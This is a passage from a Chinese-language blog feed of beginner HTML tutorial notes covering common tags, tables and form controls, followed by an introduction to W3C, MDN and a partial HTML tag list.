class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">标题标签<span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>...<span class="tag">&lt;<span class="name">h6</span>&gt;</span><span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">水平线<span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">段落<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">换行<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">引用&lt;blockquote<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line">预格式<span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">引用标签```<span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line">表明标签中的文字，为引用的内容，浏览器显示为等宽字体，并缩进。</span><br><span class="line">cite属性，表明引用的来源，一般为引用的网址URL</span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">cite</span>=<span class="string">&quot;http：//www.yt4561761.com&quot;</span>&gt;</span>dfdsfsdfd<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span> </span><br><span class="line">预格式标签<span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">浏览器解析时，会按照等宽字体显示，并保留标签内的空格和回车。</span><br><span class="line">常用于保留代码格式。</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>yt4561761yt4561761yt4561761<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>【有序列表ol order list】</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>四<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>【无序列表ul unorder list】</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>【定义描述列表】</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>描述项<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>一般情况下，标题dt只有一项。描述项dd可以有多项。<br>浏览器显示时，标题顶格显示，dd缩进显示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>这是dl列表的标题<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>描述项1<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>描述项2<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>描述项3<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><p>【图片组合标签figure】</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1-<span class="tag">&lt;<span class="name">figure</span>&gt;</span><span class="tag">&lt;/<span class="name">figure</span>&gt;</span>标签有两个子标签：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span>:一幅图片，src表示图片的路径。</span><br><span class="line"><span class="tag">&lt;<span class="name">figcaption</span>&gt;</span><span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span>：图片的标题</span><br><span class="line">2-浏览器显示为：图片与标题上下排列，且整体向后缩进一个单位。</span><br><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/icon.png&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>asd</span><br><span class="line"><span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure><p>【分区标签div】<br>常配合CSS使用，为网页中最常用的分区标签，常用于网页布局使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width：100%; height：100px; &quot;</span>&gt;</span></span><br><span class="line">这是div里面的文字</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>div里面的标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.常见的行级标签</p><p>【常见的行级标签】<br>span 文本<br>img 图片<br>em 强调<br>strong 强调<br>q 短引用<br>a 超链接<br>i 倾斜<br>b 加粗<br>small 缩小字体<br>u 下划线</p><p>span（文本）：用于包裹一部分文字，进行特定样式的修改。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color:red; font-size:36px;&quot;</span>&gt;</span>酷<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>em（强调）：浏览器显示为倾斜。<br>strong（强调）：浏览器显示为加粗。</p><p>【strong&#x2F;em&#x2F;i&#x2F;b 标签的区别】<br>1-em和strong都表示强调，strong&gt;em,strong和em标签均可多层嵌套，表示强调程度的递增。<br>2-em和i都能倾斜，Strong和b都能加粗。但是Strong和em多了一层强调的语义。可以帮助搜索 引擎快速抓取网站重点。且html5要求开发者尽可能实现代码的语义化。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>我真踏马帅！！<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>我真籍八帅！！<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>我被i标签弄斜了<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>我被b标签弄粗了<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>【q(短引用)】常用于一句话的引用，cite属性表示引用来源，浏览器解析时，会在内容的前后插入双引号。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">q</span> <span class="attr">cite</span>=<span class="string">&quot;www.yt4561761.com&quot;</span>&gt;</span>那你很棒哦<span class="tag">&lt;/<span class="name">q</span>&gt;</span></span><br></pre></td></tr></table></figure><p>small（缩小字体）：small标签可多层嵌套，表示比默认字体小一号，直到小到最小号为止。</p><p>big（放大字体）：亦可多层嵌套，直到最大。<br>但在最新规范中，small和big标签不提倡使用。提倡使用style&#x3D;”font-size:11px;”CSS样式替代。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>那你很<span class="tag">&lt;<span class="name">big</span>&gt;</span><span class="tag">&lt;<span class="name">big</span>&gt;</span><span class="tag">&lt;<span class="name">big</span>&gt;</span><span class="tag">&lt;<span class="name">big</span>&gt;</span><span class="tag">&lt;<span class="name">big</span>&gt;</span>棒<span class="tag">&lt;/<span class="name">big</span>&gt;</span><span class="tag">&lt;/<span class="name">big</span>&gt;</span><span class="tag">&lt;/<span class="name">big</span>&gt;</span><span class="tag">&lt;/<span class="name">big</span>&gt;</span><span class="tag">&lt;/<span class="name">big</span>&gt;</span>哦！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>【img 图片标签】<br>1-src属性：表示图片引用路径。<br>常见路径的写法：<br>①相对路径：<br>Ⅰ -当图片在当前文件下一层时：文件夹名&#x2F;图片名 例如：img&#x2F;abc.jpg<br>Ⅱ-当图片与当前文件在同一层时：图片名 例如：src&#x3D;”abc.jpg”<br>Ⅲ-当图片在当前文件上一层时：..&#x2F;图片名 例如：src&#x3D;”..&#x2F;abc.jpg”<br>使用相对路径时，图片最外层只能放到网站根目录（图片必须要在项目文件夹中）<br>②绝对路径：写法file：&#x2F;&#x2F;&#x2F;E:&#x2F;aaa.png 但是，严禁使用<br>③网络连接：直接使用图片的网络地址，但由于图片在别的服务器，不可控，故不建议使用<br>2-title:图片的标题。当鼠标指上时，显示的提示文字。<br>3-alt：当图片无法加载时显示的文字。<br>4-width&#x2F;height:图片的尺寸，相当于CSS中的style&#x3D;”width:”<br>5-align:图片周围的文字，相对于图片的排列方式。可选值：top&#x2F;center&#x2F;bottm</p><p>4.表格标签</p><p>【table】</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span>表格框</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>表格行</span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>表格列</span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span>表格标题列（将tr中的td替换为th)，th默认加粗且在单元格居中显示。</span><br></pre></td></tr></table></figure><p>【table的常用属性】<br>1-border：表格边框属性；当使用border&#x3D;”1”设置边框时，会在所有td以及table上嵌套边框，当border加大时，只有table框会加粗。<br>2-cellspacing：单元格与单元格之间的间隙。当cellspacing&#x3D;”0”时，单元格之间的间隙为0，但边框线并不会合并。<br>☆☆合并边框的写法style&#x3D;”border-collapse:collapse;” 使用边框合并时，无需设置cellspacing。<br>3-cellpadding:单元格内边距，单元格中文字与单元格边框之间的距离。<br>4-width&#x2F;height:表格的宽高<br>5-align：设置表格在父容器中的对齐方式 ，left&#x2F;居左 center&#x2F;居中 right&#x2F;居右<br>☆☆当表格使用align属性时，相当于使表格浮动，可能会导致表格后面的元素受表格浮动影响，导致布局错乱。<br>6-bgcolor：背景色<br>7-background：背景图，后接相对路径。背景图和背景色同时生效时，图会覆盖背景色<br>8-bordercolor：设置边框颜色</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure><p>标签的属性<br>当表格属性与行列属性冲突时，以行列属性为优先，属性设置优先级td&gt;tr&gt;table。<br>1-width,height:给单个的行列设置宽高<br>2-bgcolor:背景色<br>3-align：设置单元格中的文字，在单元格中的水平对齐方式 left&#x2F;center&#x2F;right<br>4-valign:设置单元格中文字在格中的垂直对齐方式 top&#x2F;center&#x2F;bottom<br>5-nowrap:nowrap&#x3D;”nowrap”设置单元格文字行末不断行</p><p>【表格的跨行与跨列】<br>1-跨列：colspan，某单元格跨N列，则该单元格右边的N-1个td就不需要了。<br>2-跨行：rowspan，某单元格跨N行，则该单元格下边的N-1个td就不需要了。</p><p>5.表单标签<br>【form两个重要属性】<br>action：表单需要提交的服务器地址<br>method：表单提交数据使用的方法，get&#x2F;post<br>get和post的区别<br>① get传参使用URL传递，所有参数在地址栏可见，不安全；get传参数据量有限。<br>② post传参使用http请求传递，比较安全；post可以传递大量数据。<br>但是，get请求的传输速率比post快。</p><p>URL传参的形式：链接URL地址?name1&#x3D;value1&amp;name2&#x3D;value2</p><p>【input的常用属性】<br>① type：设置input的输入类型<br>② name：给input输入框命名。一般情况下，name属性必不可少。因为，传递数据时，使用name&#x3D;value（输入内容）的形式传递。<br>③ value：input输入框的默认值<br>④ placeholder：输入框的提示内容。当input有默认的value或输入值时，placeholder消失</p><p>【input-type属性的常用属性值】<br>① text：文本输入框<br>② password：密码输入框，输入内容默认显示小黑点<br>③ radio：单选框 checkbox：复选框<br>使用radio&#x2F;checkbox时，value属性必填。提交时，提交的为value中的默认值；<br>radio&#x2F;checkbox凭借name属性，确定是否属于同一组，name相同为同组，只能选一个<br>使用checked&#x3D;”checked”属性，设置默认选中项<br>④ file：文件上传<br>使用accept&#x3D;”类型”，设置只能上传的文件类型，如 accept&#x3D;image&#x2F;* 表示任意格式图片<br>⑤ submit：提交按钮，将所有表单数据提交至后台服务器<br>⑥ reset： 重置表单数据<br>⑦ image：图形提交按钮，跟submit一样，具有表单提交功能<br>使用src属性确定图片路径<br>⑧ button：普通按钮，没有屌用</p><p>【属性名&#x3D;属性值的情况】<br>① checked&#x3D;”checked” 设置radio<br>② multiple&#x3D;”multiple” 设置select控件为多选，可在界面使用Ctrl+鼠标，进行多选。一般不用。<br>③ selected&#x3D;”selected” 设置select控件，默认选中的option选项<br>④ readonly&#x3D;”readonly”<br>⑤ disabled&#x3D;”disabled”<br>当input被disabled时，该input的name和value数据将无法向后台传送<br>⑥ hidden&#x3D;”hidden” 隐藏控件。等效于</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hiden&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>⑦ nowrap&#x3D;nowrap</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">【下拉选择控件 select】</span><br><span class="line">① 写法：<span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>option可以有N多个</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">② name属性，应该写在<span class="tag">&lt;<span class="name">select</span>&gt;</span>上，所有选项只有一个name</span><br><span class="line">③ multiple=&quot;multiple&quot; 设置select控件为多选，可在界面使用Ctrl+鼠标，进行多选。一般 不用。</span><br><span class="line">④ option常用属性：</span><br><span class="line">value=&quot;&quot;:当option没有value属性时，往后台传递的是<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>标签中的文字；</span><br><span class="line">当option有value属性时，往后台传递的是value属性的值。</span><br><span class="line">title=&quot;&quot;:鼠标指上后显示的文字。</span><br><span class="line">selected=&quot;selected&quot;:默认选中。</span><br><span class="line">⑤ <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;山东省&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span> :用于将option标签进行分组，label属性表示分组名。</span><br><span class="line"> </span><br><span class="line">【文本域 textarea】</span><br><span class="line">① 写法：<span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">② 设置宽高style=&quot;width: 200px; height: 150px;&quot; 自身有cols=&quot;&quot; rows=&quot;&quot;两个属性，但不常用</span><br><span class="line">③ readonly=&quot;readonly&quot; 设置为只读模式，不允许编辑。</span><br><span class="line">④ style=&quot;resize: none;&quot; 设置为宽高不允许修改。</span><br><span class="line">⑤ style=&quot;overflow: ;&quot; 设置当文字超出区域时，如何处理。</span><br><span class="line">也可以通过overflow-x/overflow-y分别设置水平垂直方向的显示方式。</span><br><span class="line">常用属性值:hidden 超出区域的文字，隐藏无法显示</span><br><span class="line">scroll 无论文字多少，均会显示滚动</span><br><span class="line">auto 自动，根据文字多少自动决定是否显示滚动条（默认样式）</span><br></pre></td></tr></table></figure><p>【表格的边框与标题】</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span> 表格的边框</span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span>边框标题<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">...若干个表单元素</span><br><span class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML简介</title>
      <link href="/posts/8ad51e38/"/>
      <url>/posts/8ad51e38/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是W3C"><a href="#什么是W3C" class="headerlink" title="什么是W3C"></a>什么是W3C</h1><p>万维网联盟（World Wide Web Consortium，W3C），又称W3C理事会，是万维网的主要国际标准组织。为半自治非政府组织（quasi-autonomous non-governmental organisation）。</p><h2 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h2><p>万维网联盟（W3C）由蒂姆·伯纳斯-李于1994年10月离开欧洲核子研究中心（CERN）后成立，在欧盟执委会和国防高等研究计划署（DARPA）的支持下成立于麻省理工学院MIT计算机科学与人工智能实验室（MIT／LCS），DARPA曾率先推出了互联网及其前身ARPANET。</p><p>该组织试图透过W3C制定的新标准来促进业界成员间的兼容性和协议。不兼容的HTML版本由不同的供应商提供，导致网页显示方式不一致。联盟试图让所有的供应商实施一套由联盟选择的核心原则和组件。</p><p>CERN最初打算做为W3C的欧洲分支机构，然而CERN希望把重点放在粒子物理而不是信息技术上。1995年4月，法国国家信息与自动化研究所（INRIA）成为W3C的欧洲机构。1996年9月，庆应义塾大学SFC研究所成为W3C亚洲机构。从1997年开始，W3C在世界各地创建了区域办事处。截至2009年9月，已有十八个区域办事处，涵盖澳大利亚、比荷卢联盟、巴西、中国、芬兰、德国、奥地利、希腊、香港、匈牙利、印度、以色列、意大利、韩国、摩洛哥、南非、西班牙、瑞典。2013年1月，北京航空航天大学成为W3C中国机构。2016年，W3C在英国和爱尔兰创建了区域办事处。</p><h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><p>为解决网络应用中不同平台、技术和开发者带来的不兼容问题，保障网络信息的顺利和完整流通，万维网联盟制定了一系列标准并督促网络应用开发者和内容提供者遵循这些标准。标准的内容包括使用语言的规范，开发中使用的导则和解释引擎的行为等等。W3C也制定了包括XML和CSS等的众多影响深远的标准规范。</p><p>但是，W3C制定的网络标准似乎并非强制，而只是推荐标准。因此部分网站仍然不能完全实现这些标准，特别是使用早期所见即所得网页编辑软件设计的网页往往会包含大量非标准代码。</p><h1 id="什么是MDN"><a href="#什么是MDN" class="headerlink" title="什么是MDN"></a>什么是MDN</h1><p>MDN Web Docs（旧称Mozilla Developer Network、Mozilla Developer Center，简称MDN）是一个汇集众多Mozilla基金会产品和网络技术开发文档的免费网站。</p><h2 id="MDN历史"><a href="#MDN历史" class="headerlink" title="MDN历史"></a>MDN历史</h2><p>该项目始于2005年，最初由Mozilla公司员工Deb Richardson领导。自2006年以来，文档工作由Eric Shepherd领导。</p><p>网站最初的内容是由DevEdge提供，但在AOL收购Netscape后，DevEdge网站也宣布关闭。为此Mozilla基金会向AOL获取了DevEdge发布的内容，同时将DevEdge内容搬移到mozilla.org。</p><p>MDN本身有一个论坛，并在Mozilla IRC网络上有一个IRC频道#mdn。MDN由Mozilla公司提供服务器和员工的资助。</p><p>2016年10月3日发表的Brave网页浏览器将MDN作为其搜索引擎选项之一。</p><h1 id="HTML标签列表"><a href="#HTML标签列表" class="headerlink" title="HTML标签列表"></a>HTML标签列表</h1><h2 id="根元素节"><a href="#根元素节" class="headerlink" title="根元素节"></a>根元素节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>代表 HTML 或 XHTML 文档的根。其他所有元素必须是这个元素的子节点。</span><br></pre></td></tr></table></figure><h2 id="文档元数据节"><a href="#文档元数据节" class="headerlink" title="文档元数据节"></a>文档元数据节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>代表关于文档元数据的一个集合，包括脚本或样式表的链接或内容。</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>定义文档的标题，将显示在浏览器的标题栏或标签页上。该元素只能包含文本，包含的标签不会被解释。</span><br><span class="line"><span class="tag">&lt;<span class="name">base</span>&gt;</span>定义页面上相对 URL 的基准 URL。</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span>&gt;</span>用于链接外部的 CSS 到该文档。</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span>&gt;</span>定义其他 HTML 元素无法描述的元数据。</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>用于内联 CSS。</span><br></pre></td></tr></table></figure><h2 id="脚本节"><a href="#脚本节" class="headerlink" title="脚本节"></a>脚本节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">    定义一个内联脚本或链接到外部脚本。脚本语言是 JavaScript。</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span>  定义当浏览器不支持脚本时显示的替代文字。</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">template</span>&gt;</span>  这个元素在 HTML5 中加入通过 JavaScript 在运行时实例化内容的容器。</span></span></span><br></pre></td></tr></table></figure><h2 id="章节节"><a href="#章节节" class="headerlink" title="章节节"></a>章节节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>代表 HTML文档的内容。在文档中只能有一个 <span class="tag">&lt;<span class="name">body</span>&gt;</span> 元素。</span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span> 这个元素在 HTML5 中加入定义文档中的一个章节。</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span> 这个元素在 HTML5 中加入定义只包含导航链接的章节。</span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span> 这个元素在 HTML5 中加入定义可以独立于内容其余部分的完整独立内容块。</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span> 这个元素在 HTML5 中加入定义和页面内容关联度较低的内容——如果被删除，剩下的内容仍然很合理。</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>,<span class="tag">&lt;<span class="name">h2</span>&gt;</span>,<span class="tag">&lt;<span class="name">h3</span>&gt;</span>,<span class="tag">&lt;<span class="name">h4</span>&gt;</span>,<span class="tag">&lt;<span class="name">h5</span>&gt;</span>,<span class="tag">&lt;<span class="name">h6</span>&gt;</span>标题元素实现了六层文档标题，<span class="tag">&lt;<span class="name">h1</span>&gt;</span> 是最大的标题，<span class="tag">&lt;<span class="name">h6</span>&gt;</span> 是最小的标题。标题元素简要地描述章节的主题。</span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span> 这个元素在 HTML5 中加入定义页面或章节的头部。它经常包含 logo、页面标题和导航性的目录。</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span> 这个元素在 HTML5 中加入定义页面或章节的尾部。它经常包含版权信息、法律信息链接和反馈建议用的地址。</span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>定义包含联系信息的一个章节。</span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>这个元素在 HTML5 中加入定义文档中主要或重要的内容。</span><br></pre></td></tr></table></figure><h2 id="组织内容节"><a href="#组织内容节" class="headerlink" title="组织内容节"></a>组织内容节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>定义一个段落。</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span>代表章节、文章或其他长内容中段落之间的分隔符。</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>代表其内容已经预先排版过，格式应当保留 。</span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>代表引用自其他来源的内容。</span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span>定义一个有序列表。</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>定义一个无序列表。</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>定义列表中的一个列表项。</span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span>定义一个定义列表（一系列术语和其定义）。</span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>代表一个由下一个 <span class="tag">&lt;<span class="name">dd</span>&gt;</span> 定义的术语。</span><br><span class="line"><span class="tag">&lt;<span 